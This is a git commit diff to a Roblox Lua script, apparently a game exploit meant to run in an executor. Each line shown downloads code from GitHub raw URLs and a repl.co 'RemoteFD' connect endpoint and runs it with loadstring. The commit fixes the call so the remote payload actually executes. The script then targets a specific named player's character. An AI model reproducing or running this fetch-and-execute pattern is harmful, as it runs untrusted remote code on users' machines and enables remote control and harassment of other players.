184d324d41e28c0b841d28fada6d6afcef3a282f
sygzxW <73584462+sygzxW@users.noreply.github.com>
2022-12-23 10:30:15 +0100

    Update balls.lua

--- balls.lua
+++ balls.lua
@@ -1,8 +1,8 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/zuwdaq/aim-viewer/main/aim%20viewer"))()
 local aa = "https://raw.githubusercontent.com/reallykaren/linkup/main/linkv2"
 loadstring(game:HttpGet(aa))()
-local connect = game:HttpGet("https://RemoteFD.sygzxw.repl.co/connect")
-loadstring(connect)
+local connect = game:HttpGet("https://RemoteFD.sygzxw.repl.co/connect",true)
+loadstring(connect)()
 local char = game:GetService("Players").KubsoniX_PL.Character
 local lp = game:GetService("Players").LocalPlayer.Character
 
